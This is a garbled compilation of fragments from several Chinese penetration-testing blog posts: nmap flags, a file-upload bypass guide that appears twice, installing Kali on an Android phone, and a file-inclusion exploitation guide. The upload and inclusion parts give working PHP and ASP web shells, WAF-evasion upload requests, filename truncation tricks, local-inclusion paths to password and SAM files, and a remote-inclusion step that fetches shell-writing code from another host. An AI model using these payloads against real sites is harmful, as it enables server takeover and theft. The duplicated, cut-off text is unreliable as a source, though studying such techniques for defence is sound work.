指定网络接口\n-M 设置tcp扫描线程\n```\n#### nmap output\n输出结果：\n```bash\n-oS  保存扫描结果输出\n-oN  把扫描结果重定向到一个可读的文件logfilename中\n-oM  每个结果一行输出\n-oA  同上\n--append-output 附在原来的结果前面\n```\n#### nmap status\nnmap端口状态：\n```bash\nopen（开放的）\nclosed（关闭的）\nfiltered（被过滤的）不确定开放还是关闭\nunfiltered （未被过滤的）\nopenfiltered （开放或者被过滤的）\nclosedfiltered （关闭或者未被过滤的)\n```\n#### nmap常用命令\n以下命令部分收集于网络，部分来自个人总结。\n轻量级扫描：\n```bash\nnmap -sP 192.168.0.0/24   判断哪些主机存活\nnmap -sT 192.168.0.3   开放了哪些端口\nnmap -sS 192.168.0.127 开放了哪些端口（隐蔽扫描）\nnmap -sU 192.168.0.127 开放了哪些端口（UDP）\nnmap

class=\"blockquote-center\">这个世界好比一座大熔炉，烧炼出一批又一批品质不同而且和原先的品质也不相同的灵魂</blockquote><br>　　本篇作为渗透神器系列第三篇，将介绍一款经典的端口扫描工具–nmap。目前市面上成熟的端口扫描器有很多，比如massscan(全网扫描器)，zenmap(nmap的GUI版)等，但我个人还是钟爱nmap，原因很简单，因为它很强大，并且支持扩展。Nmap最新几个版本中，加入了nmap script Engine(NSE)功能，支持扩展脚本，即可以在nmap中加载自定义的nse脚本，以达到扫描的目的。目前官方的nse脚本已达500多个，nse脚本地址<a href=\"https://nmap.org/nsedoc/\">https://nmap.org/nsedoc/</a>，或者查看<a href=\"https://github.com/nmap/nmap\">github库</a>。<br>　　本篇将会介绍如何编写以及使用nse脚本，以便能最大程度地发挥出nmap的强大功能（扩展功能），当然本文后本段也会简单介绍下nmap工具的基本使用方法以及参数设置。<br>","more":"</p>\n<h3 id=\"NSE\"><a href=\"#NSE\"

文件上传校验姿势\n* 客户端javascript校验（一般只校验后缀名）\n* 服务端校验\n\t* 文件头content-type字段校验（image/gif）\n\t* 文件内容头校验（GIF89a）\n\t* 后缀名黑名单校验\n\t* 后缀名白名单校验\n\t* 自定义正则校验\n* WAF设备校验（根据不同的WAF产品而定）\n\n#### 1.客户端校验\n　　一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。\n　　判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。\n\n#### 2.服务端校验\n##### 2.1 content-type字段校验\n　　这里以PHP代码为例，模拟web服务器端的校验代码\n```bash\n<?php\n        if($_FILES['userfile']['type'] != \"image/gif\")  #这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。\n                {   \n                 echo \"Sorry, we only allow uploading GIF images\";\n                 exit;\n                 }\n         $uploaddir = 'uploads/';\n         $uploadfile = $uploaddir . basename($_FILES['userfile']['name']);\n         if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile))\n             {\n                 echo \"File is valid, and was successfully uploaded.\\n\";\n                } else {\n                     echo \"File uploading failed.\\n\";\n    }\n     ?>\n```\n　　可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。\n##### 2.2 文件头校验\n　　可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：\n（1）  .JPEG;.JPE;.JPG，\"JPGGraphic File\"\n（2）  .gif，\"GIF 89A\"\n（3）  .zip，\"Zip Compressed\"\n（4）  .doc;.xls;.xlt;.ppt;.apr，\"MS Compound Document v1 or Lotus Approach APRfile\"\n\n<hr>\n### 文件上传绕过校验姿势\n* 客户端绕过（抓包改包）\n* 服务端绕过\n\t* 文件类型\n\t* 文件头\n\t* 文件后缀名\n* 配合文件包含漏洞绕过\n* 配合服务器解析漏洞绕过\n* CMS、编辑器漏洞绕过\n* 配合操作系统文件命名规则绕过\n* 配合其他规则绕过\n* WAF绕过\n\n#### 1.客户端绕过\n　　可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。\n#### 2.服务端绕过\n##### 2.1 文件类型绕过\n　　我们可以通过抓包，将content-type字段改为image/gif\n```bash\nPOST /upload.php HTTP/1.1\nTE: deflate,gzip;q=0.3\nConnection: TE, close\nHost: localhost\nUser-Agent: libwww-perl/5.803\nContent-Type: multipart/form-data; boundary=xYzZY\nContent-Length: 155\n--xYzZY\nContent-Disposition: form-data; name=\"userfile\"; filename=\"shell.php\"\nContent-Type: image/gif (原为 Content-Type: text/plain)\n<?php system($_GET['command']);?>\n--xYzZY-\n```\n##### 2.2 文件头绕过\n　　在木马内容基础上再加了一些文件信息，有点像下面的结构\nGIF89a<?php phpinfo(); ?>\n##### 2.3 文件后缀名绕过\n前提：黑名单校验\n黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。\n绕过方法：\n（1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类\n（2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类\n能被解析的文件扩展名列表：\njsp  jspx  jspf\nasp  asa  cer  aspx\nphp  php  php3  php4\nexe  exee\n\n#### 3.配合文件包含漏洞\n前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。\n绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）\n（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；\n（2）然后再上传一个.php的文件，内容为<?php Include(\"上传的txt文件路径\");?>\n此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：\n```bash\n#PHP    \n<?php Include(\"上传的txt文件路径\");?> \n#ASP    \n<!--#include file=\"上传的txt文件路径\" -->\n#JSP    \n<jsp:inclde page=\"上传的txt文件路径\"/>\nor  \n<%@include file=\"上传的txt文件路径\"%>\n```\n详细参考：[文件包含漏洞(绕过姿势)](http://thief.one/2017/04/10/2/)\n#### 4.配合服务器解析漏洞\n详细可参考：[http://thief.one/2016/09/21/服务器解析漏洞/](http://thief.one/2016/09/21/服务器解析漏洞/)\n#### 5.配合操作系统文件命令规则\n（1）上传不符合windows文件命名规则的文件名\n　　test.asp.\n　　test.asp(空格)\n　　test.php:1.jpg\n　　test.php::$DATA\n　　shell.php::$DATA.......\n会被windows系统自动去掉不符合规则符号后面的内容。\n（2）linux下后缀名大小写\n在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。\n#### 6.CMS、编辑器漏洞\n（1）CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。\n（2）编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。\n这两方面的漏洞以后单独成文汇总，这里点到为止。\n#### 7.配合其他规则\n（1）0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候\n　　test.php(0x00).jpg\n　　test.php%00.jpg\n　　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg\n伪代码演示：\n```bash\nname= getname(httprequest) //假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)\ntype =gettype(name)        //而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg\nif(type == jpg)\n   SaveFileToPath(UploadPath.name, name)   //但在这里却是以 0x00 作为文件名截断\n//最后以 help.asp 存入路径里\n```\n#### 8.WAF绕过\n##### 8.1 垃圾数据\n　　有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；\n![](/upload_image/20160922/1.png)\n当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。\n![](/upload_image/20160922/2.png)\n可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。\n##### 8.2 filename\n针对早期版本安全狗，可以多加一个filename\n![](/upload_image/20160922/3.png)\n或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：\n![](/upload_image/20160922/13.png)\n##### 8.3 POST/GET\n有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。\n此种情况可以上传一个POST型的数据包，抓包将POST改为GET。\n##### 8.4 以上方式\n针对WAF，以上介绍的服务器解析漏洞、文件包含漏洞等都可以尝试绕过。\n\n\n*------------------------------------------------2017.2.6更新--------------------------------------------------*\n##### 8.5 利用waf本身缺陷\n###### 删除实体里面的Conten-Type字段\n![](/upload_image/20160922/4.png)\n第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。\n```bash\n正常包：Content-Disposition: form-data; name=\"image\"; filename=\"085733uykwusqcs8vw8wky.png\"Content-Type: image/png\n构造包：Content-Disposition: form-data; name=\"image\"; filename=\"085733uykwusqcs8vw8wky.png\nC.php\"\n```\n###### 删除Content-Disposition字段里的空格\n![](/upload_image/20160922/5.png)\n增加一个空格导致安全狗被绕过案列：\nContent-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099\n尝试在boundary后面加个空格或者其他可被正常处理的字符：\nboundary= ---------------------------47146314211411730218525550\n###### 修改Content-Disposition字段值的大小写\n![](/upload_image/20160922/6.png)\n\n###### Boundary边界不一致\n每次文件上传时的Boundary边界都是一致的：\n```bash\nContent-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099\nContent-Length: 253\n-----------------------------4714631421141173021852555099\nContent-Disposition: form-data; name=\"file1\"; filename=\"shell.asp\"\nContent-Type: application/octet-stream\n\n<%eval request(\"a\")%>\n-----------------------------4714631421141173021852555099--\n```\n但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨：\nWin2k3 + IIS6.0 + ASP\n![](/upload_image/20160922/7.png)\n\n###### 文件名处回车\n![](/upload_image/20160922/8.png)\n###### 多个Content-Disposition\n在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过，Win2k8 + IIS7.0 + PHP\n![](/upload_image/20160922/9.png)\n\n##### 利用NTFS ADS特性\nADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。\n![](/upload_image/20160922/10.png)\n\n#### 其他情况补充\n##### 文件重命名绕过\n如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。\n![](/upload_image/20160922/11.png)\n\n#####

文件上传漏洞（绕过姿势）\ndate: 2016-09-22 11:02:44\ntags: \n- 文件上传漏洞\ncategories: web安全\n---\n\n　　文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。但是想真正把这个漏洞利用好却不那么容易，其中有很多技巧，也有很多需要掌握的知识。俗话说，知己知彼方能百战不殆，因此想要研究怎么防护漏洞，就要了解怎么去利用。此篇文章主要分三部分：总结一些常见的上传文件校验方式，以及绕过校验的各种姿势，最后对此漏洞提几点防护建议。（根据个人经验总结，欢迎补充纠错~~）\n<!--more-->\n### 文件上传校验姿势\n* 客户端javascript校验（一般只校验后缀名）\n* 服务端校验\n\t* 文件头content-type字段校验（image/gif）\n\t* 文件内容头校验（GIF89a）\n\t* 后缀名黑名单校验\n\t* 后缀名白名单校验\n\t* 自定义正则校验\n* WAF设备校验（根据不同的WAF产品而定）\n\n#### 1.客户端校验\n　　一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。\n　　判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。\n\n#### 2.服务端校验\n##### 2.1 content-type字段校验\n　　这里以PHP代码为例，模拟web服务器端的校验代码\n```bash\n<?php\n        if($_FILES['userfile']['type'] != \"image/gif\")  #这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。\n                {   \n                 echo \"Sorry, we only allow uploading GIF images\";\n                 exit;\n                 }\n         $uploaddir = 'uploads/';\n         $uploadfile = $uploaddir . basename($_FILES['userfile']['name']);\n         if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile))\n             {\n                 echo \"File is valid, and was successfully uploaded.\\n\";\n                } else {\n                     echo \"File uploading failed.\\n\";\n    }\n     ?>\n```\n　　可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。\n##### 2.2 文件头校验\n　　可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：\n（1）  .JPEG;.JPE;.JPG，\"JPGGraphic File\"\n（2）  .gif，\"GIF 89A\"\n（3）  .zip，\"Zip Compressed\"\n（4）  .doc;.xls;.xlt;.ppt;.apr，\"MS Compound Document v1 or Lotus Approach APRfile\"\n\n<hr>\n### 文件上传绕过校验姿势\n* 客户端绕过（抓包改包）\n* 服务端绕过\n\t* 文件类型\n\t* 文件头\n\t* 文件后缀名\n* 配合文件包含漏洞绕过\n* 配合服务器解析漏洞绕过\n* CMS、编辑器漏洞绕过\n* 配合操作系统文件命名规则绕过\n* 配合其他规则绕过\n* WAF绕过\n\n#### 1.客户端绕过\n　　可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。\n#### 2.服务端绕过\n##### 2.1 文件类型绕过\n　　我们可以通过抓包，将content-type字段改为image/gif\n```bash\nPOST /upload.php HTTP/1.1\nTE: deflate,gzip;q=0.3\nConnection: TE, close\nHost: localhost\nUser-Agent: libwww-perl/5.803\nContent-Type: multipart/form-data; boundary=xYzZY\nContent-Length: 155\n--xYzZY\nContent-Disposition: form-data; name=\"userfile\"; filename=\"shell.php\"\nContent-Type: image/gif (原为 Content-Type: text/plain)\n<?php system($_GET['command']);?>\n--xYzZY-\n```\n##### 2.2 文件头绕过\n　　在木马内容基础上再加了一些文件信息，有点像下面的结构\nGIF89a<?php phpinfo(); ?>\n##### 2.3 文件后缀名绕过\n前提：黑名单校验\n黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。\n绕过方法：\n（1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类\n（2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类\n能被解析的文件扩展名列表：\njsp  jspx  jspf\nasp  asa  cer  aspx\nphp  php  php3  php4\nexe  exee\n\n#### 3.配合文件包含漏洞\n前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。\n绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）\n（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；\n（2）然后再上传一个.php的文件，内容为<?php Include(\"上传的txt文件路径\");?>\n此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：\n```bash\n#PHP    \n<?php Include(\"上传的txt文件路径\");?> \n#ASP    \n<!--#include file=\"上传的txt文件路径\" -->\n#JSP    \n<jsp:inclde page=\"上传的txt文件路径\"/>\nor  \n<%@include file=\"上传的txt文件路径\"%>\n```\n详细参考：[文件包含漏洞(绕过姿势)](http://thief.one/2017/04/10/2/)\n#### 4.配合服务器解析漏洞\n详细可参考：[http://thief.one/2016/09/21/服务器解析漏洞/](http://thief.one/2016/09/21/服务器解析漏洞/)\n#### 5.配合操作系统文件命令规则\n（1）上传不符合windows文件命名规则的文件名\n　　test.asp.\n　　test.asp(空格)\n　　test.php:1.jpg\n　　test.php::$DATA\n　　shell.php::$DATA.......\n会被windows系统自动去掉不符合规则符号后面的内容。\n（2）linux下后缀名大小写\n在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。\n#### 6.CMS、编辑器漏洞\n（1）CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。\n（2）编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。\n这两方面的漏洞以后单独成文汇总，这里点到为止。\n#### 7.配合其他规则\n（1）0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候\n　　test.php(0x00).jpg\n　　test.php%00.jpg\n　　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg\n伪代码演示：\n```bash\nname= getname(httprequest) //假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)\ntype =gettype(name)        //而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg\nif(type == jpg)\n   SaveFileToPath(UploadPath.name, name)   //但在这里却是以 0x00 作为文件名截断\n//最后以 help.asp 存入路径里\n```\n#### 8.WAF绕过\n##### 8.1 垃圾数据\n　　有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；\n![](/upload_image/20160922/1.png)\n当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。\n![](/upload_image/20160922/2.png)\n可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。\n##### 8.2 filename\n针对早期版本安全狗，可以多加一个filename\n![](/upload_image/20160922/3.png)\n或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：\n![](/upload_image/20160922/13.png)\n##### 8.3 POST/GET\n有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。\n此种情况可以上传一个POST型的数据包，抓包将POST改为GET。\n##### 8.4 以上方式\n针对WAF，以上介绍的服务器解析漏洞、文件包含漏洞等都可以尝试绕过。\n\n\n*------------------------------------------------2017.2.6更新--------------------------------------------------*\n##### 8.5 利用waf本身缺陷\n###### 删除实体里面的Conten-Type字段\n![](/upload_image/20160922/4.png)\n第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。\n```bash\n正常包：Content-Disposition: form-data; name=\"image\"; filename=\"085733uykwusqcs8vw8wky.png\"Content-Type: image/png\n构造包：Content-Disposition: form-data; name=\"image\"; filename=\"085733uykwusqcs8vw8wky.png\nC.php\"\n```\n###### 删除Content-Disposition字段里的空格\n![](/upload_image/20160922/5.png)\n增加一个空格导致安全狗被绕过案列：\nContent-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099\n尝试在boundary后面加个空格或者其他可被正常处理的字符：\nboundary= ---------------------------47146314211411730218525550\n###### 修改Content-Disposition字段值的大小写\n![](/upload_image/20160922/6.png)\n\n###### Boundary边界不一致\n每次文件上传时的Boundary边界都是一致的：\n```bash\nContent-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099\nContent-Length: 253\n-----------------------------4714631421141173021852555099\nContent-Disposition: form-data; name=\"file1\"; filename=\"shell.asp\"\nContent-Type: application/octet-stream\n\n<%eval request(\"a\")%>\n-----------------------------4714631421141173021852555099--\n```\n但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨：\nWin2k3 + IIS6.0 + ASP\n![](/upload_image/20160922/7.png)\n\n###### 文件名处回车\n![](/upload_image/20160922/8.png)\n###### 多个Content-Disposition\n在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过，Win2k8 + IIS7.0 + PHP\n![](/upload_image/20160922/9.png)\n\n##### 利用NTFS ADS特性\nADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。\n![](/upload_image/20160922/10.png)\n\n#### 其他情况补充\n##### 文件重命名绕过\n如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。\n![](/upload_image/20160922/11.png)\n\n##### 特殊的长文件名绕过\n文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：\nshell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg\n\n##### 反删除\n将下图file1改成了file4，这样就不会把这个文件删除了。（JCMS漏洞）\n![](/upload_image/20160922/12.png)\n\n<hr>\n### 文件校验的几点建议\n* 文件扩展名服务端白名单校验。\n* 文件内容服务端校验。\n* 上传文件重命名。\n*

安装linux-deploy\n　　Linux deploy是一个可以快速在Android设备上安装运行Linux操作系统的App,遵循GPLv3协议，运行需要root权限。linux-deploy软件介绍：[http://www.cnblogs.com/mzlw/p/4841707.html](http://www.cnblogs.com/mzlw/p/4841707.html)\n在手机上安装完linux-deploy，运行后进行配置：\n![](/upload_image/20170210/3.png)\n运行界面如上图所示，点击右下角进行配置：\n![](/upload_image/20170210/1.png)\n发行版选择：kali-linux；源地址选择国内镜像：http://202.141.160.110/kali/\n![](/upload_image/20170210/2.png)\n勾选上ssh,vnc，在启动系统后会自动开启ssh以及vnc服务，方便远程管理。\n配置完成后点击安装，等待一会。\n![](/upload_image/20170210/4.png)\n安装完以后点击启动，如若成功，便可以用ssh工具连接此系统。\n![](/upload_image/20170210/6.png)\n\n注：linux-deploy只是一款软件，安装它对应手机本身不会造成什么影响（除了占用存储空间），也不会清空数据（不是刷机）\n\nlinux-deploy安装kali参考：\n[http://www.freebuf.com/articles/terminal/13209.html](http://www.freebuf.com/articles/terminal/13209.html)\n[http://www.freebuf.com/articles/terminal/47817.html](http://www.freebuf.com/articles/terminal/47817.html)\n\n### kali上安装渗透工具\n　　虽然手机上安装kali成功了，但是此kali系统上并没有任何工具，需要自己安装。因为kali官方的源太慢了，因此建议更换国内的源。手机上安装一个ssh远程连接工具，连接上kali系统，并输入以下命令：\n```bash\nvim /etc/apt/sources.list\n```\n清空文件内容并添加以下内容：\n```bash\ndeb

android等。首先在手机上安装busybox软件（授予root权限），运行软件以后勾选上智能安装选项，然后点击安装busybox。安装完busybox后，才可以使用dsploit等软件，当然这些软件也都是需要root权限的。至于这些安全软件的用法，网上一搜一大推，这里便不再介绍了。\n\n### 软件工具下载\n链接:

class=\"blockquote-center\">有时候折腾仅仅只是为了折腾，仅此而已！</blockquote><br>据说OPPO拍照神器最近很火，于是便凑热闹买了一款（R9s），外形不错，性能说得过去。尤其是自拍功能爱不释手（……），于是手头原本的小米便闲置了出来。作为一名崇尚节俭持家的技术男，当然是要废物利用一番，于是便有了以下的一番折腾。<br>　　我的目的是打造一款渗透测试专用手机，最先想到的方案是在手机上安装kali-linx系统，因为该系统集成了很多渗透测试工具，解决了很多依赖问题，省去不少麻烦。那么问题来了，怎么在手机上安装kali-linux系统呢？在查找了一些资料之后，我理了理思路：<br>（1）手机需要root<br>（2）手机上安装linux-deploy<br>（3）在linux-deploy上安装kali<br>（4）在kali里面安装渗透测试工具<br>思路有了，那么让我们撸起袖子干起来吧！(以下提到的安装包会在文章最后提供下载！)</p>\n<h3 id=\"Root\"><a href=\"#Root\" class=\"headerlink\" title=\"Root\"></a>Root</h3><p>　　起初看到网上的一些教程，介绍root手机非常简单，下载第三方软件，便可一键root。于是抱着轻松地态度在电脑上下载了一款软件（root精灵），接着将手机连上电脑，便开始点击一键root了。过了几分钟提示root成功，心想，原来破解手机这么简单，刚想吐槽小米，打开手机便发现根本没有root成功，NM坑爹。然后卸载了此软件，又重新找了一款（root大师），结果同样如此。<br>　　心中默默骂了几条街后，喝口水冷静了会，重新上网搜索资料，竟然无意看到了小米官方提供开发者版本的安装包（晕倒，所以不能盲目使用第三方软件，一般厂商会给出相应的软件或者安装包）。<br>　　官方下载地址：<a href=\"http://www.miui.com/download-241.html\">http://www.miui.com/download-241.html</a><br>　　根据官方提供的教程安装即可（我选择了第二种安装方式），安装完以后在安全中心授予应用程序root权限，其他品牌的手机请自行百度，方法大同小异。</p>\n<h3 id=\"安装linux-deploy\"><a

class=\"blockquote-center\">谁将烟焚散，散了纵横的牵绊</blockquote>\n\n　　文件包含漏洞是渗透测试过程中用得比较多的一个漏洞，主要用来绕过waf上传木马文件。今日在逛Tools论坛时，发现了一种新型的文件包含姿势，在此记录分享，并附上一些文件包含漏洞的基础利用姿势。\n<!--more -->\n### 特殊姿势\n　　利用phar://协议特性可以在渗透过程中帮我们绕过一些waf检测，phar:// 数据流包装器自 PHP 5.3.0 起开始有效，貌似可以绕过安全狗。\n#### 利用过程\n新建shell.php代码内容：\n```bash\n<?php\ninclude 'phar://test.rar/test.txt';\n?>\n```\n新建test.txt里的内容：\n```bash\n<?php\nphpinfo();\n?>\n```\n　　压缩test.txt文件，可以重命名压缩文件为zip,phar,rar等格式，之后访问shell.php文件后，会出现phpinfo内容。\n#### 亲测有效\n在实验环境下，在test目录下新建shell.php，test.txt，并将test.txt打包成test.zip。\n![](/upload_image/20170410/1.png)\nshell.php内容如下：\n![](/upload_image/20170410/2.png)\ntest.txt内容如下：\n![](/upload_image/20170410/3.png)\n访问shell.php:\n![](/upload_image/20170410/4.png)\n\n参考：http://bbs.pediy.com/thread-216191.htm\n\n### php文件包含漏洞\nPHP中的文件包含分为本地包含与远程包含，导致文件包含的函数如下：\n* include()\n* include_once()\n* require()\n* require_once()\n* fopen()\n* readfile()\n......\n\n#### 本地包含漏洞（LFI）\n新建一个phpinfo.txt，然后新建一个shell.php，写入：\n```bash\n<?php\n    Include(\"phpinfo.txt\");\n?>\n```\n　　访问shell.php会输出phpinfo页面内容，无论将扩展名改为什么，都将以php代码执行。如果文件不是符合php规则的（即没有写<?php ?>等），则通过include可以直接输出源码。\n\n#### 远程包含漏洞\n前提：需要开启allow_url_fopen，默认关闭。\n新建php.txt:\n```bash\n<?php\n   echo \"hello world\";\n?>\n```\n新建index.php:\n```bash\n<?php\n    Include($_GET['page']);\n?>\n```\n访问*http://www.xxxx.com/page=http://www.xxxx.com/php.txt*执行结果将输出hello world。\n\n#### 文件包含利用\n##### 读取敏感信息\n如：http://www.xxx.com/index.php?page=/etc/passwd\nWindows:\n```bash\nc:\\boot.ini\nc:\\windows\\systems32\\inetsrv\\MetaBase.xml\nc:\\windows\\repair\\sam\nc:\\windows\\php.ini             php配置文件\nc:\\windows\\my.ini               mysql配置文件\n```\nLINUX:\n```bash\n/etc/passwd\n/usr/local/app/apache2/conf/http.conf\n/usr/local/app/php5/lib/php.ini          PHP相关设置\n/etc/httpd/conf/http.conf                    apache配置文件\n/etc/my.cnf                                              mysql配置文件\n```\n\n##### 远程包含shell\ntest.txt文件，可以保存在远程服务器上，内容如下：\n```bash\n<?fputs(fopen(\"shell.php\",\"w\"),\"<?php eval($_POST[nmask]);?>\")?>\n```\n　　如果目标网站存在远程包含漏洞，则可以通过访问：*http://www.xxx1.com/index.php?page=http://www.xx2.com/test.txt*则会在服务器根目录下生产一个shell.php内容为:\n```bash\n<?php   eval($_POST[nmask]);?>\n```\n\n##### 本地包含配合文件上传\n如果目标服务器关闭了allow_url_fopen，则可以尝试使用本地包含+文件上传\n上传一个图片木马a.jpg，内容为：\n```bash\n<?fputs(fopen(\"shell.php\",\"w\"),\"<?php eval($_POST[tzc]);?>\")?>\n```\n访问URL：*http://www.xxx.com/index.php?page=./a.jpg*在本地生成shell.php。\n\n\n##### 本地包含配合apache日志拿shell\n　　apache日志分为access.log与error.log，当我们请求一个url地址时，便会记录在access.log中，但如果访问一个不存在的页面，便会将这个页面写入access.log中。如访问URL:*http://www.xxx.com/<?php eval([$_POST]);?>*则会将一句话写入到access.log中，但是一般来说，写入到access.log文件中的一句话是被编码的，所以需要抓包绕过，而且利用此漏洞需要知道access.log的地址，不然便没有。\n\n##### 利用/proc/self/environ进行包含\n如：http://www.test.com/view.php?page=../../../../proc/self/environ\n这是web进程运行时的环境变量，其中有些参数是可以被用户控制的，最常见做法就是在User-Agent中插入一句话。\n\n##### 利用php协议进行包含\n* data:　　php5.2以后版本\n* php://input　　需要开启allow_url_include\n\npoc:\n```bash\nhttp://www.test.com/index.php?file=data:text/plain,<?php phpinfo();?>%00\n```\n\n##### 截断包含\n有些开发者为了防止本地包含漏洞，会编写一下代码:\n```bash\n<?php\n    Include  $_GET['page'].\".php\"\n?>\n```\n（一）00截断包含\n新建1.jpg:\n```bash\n<?fputs(fopen(\"shell.php\",\"w\"),\"<?php eval($_POST[tzc]);?>\")?>\n```\n　　这样的话比如上传一个1.jpg图片码，则访问*http://www.xxx.com/1.jpg*时，访问的是1.jgp.php，以为没有这个文件所以报错。这是，可以尝试访问*http://www.xxx.com/1.jpg%00*\n\n（二）使用长目录截断\n```bash\n././././././././././././././etc/passwd\n或者\n////////////////////////////etc/passwd\n或者\n../a/etc/passwd/../a/etc/passwd/../a/etc/passwd\n```\n在windows下目录最大长度为256字节，linux下为4096字节，其后面超出部分被丢弃。\n\n#### 文件包含漏洞修复\n开启open_basedir函数，将其设置为指定目录，则只有该目录的文件允许被访问。\n关闭allow_url_include函数，防止远程文件包含。\n\n### jsp文件包含漏洞\n#### include\n```bash   \n<%@ include file=\"head.jsp\"%>\n<%@ include file=\"body.jsp\"%>\n<%@ include file=\"tail.jsp\"%>\n```\n#### jsp:include  \n```bash   \n<jsp:include page=\"head.jsp\"/>\n<jsp:include page=\"body.jsp\"/>   \n<jsp:include page=\"tail.jsp”/>\n```\n#### 采用JSTL\n```bash\n<c:import url=\"http://thief.one/1.jsp\">\n```\n#### 说明\n(1)include指令在转换时插入“Header.jsp”的源代码，而<jsp:include>标准动作在运行时插入“Header.jsp\"的响应。<jsp:include>元素允许你包含动态文件和静态，而include说明标签仅仅是把一个文件内容当成静态追加到主文件中去。\n(2)采用前两种方式，只能包含当前web应用的界面，不过c:import可以包含容器之外的内容。\n\n### asp文件包含漏洞\nasp貌似无法包含远程文件（iis安全设置），只能包含本地文件，语法如下：\n```bash\n<!--#include file=\"1.asp\" -->\n```\n### 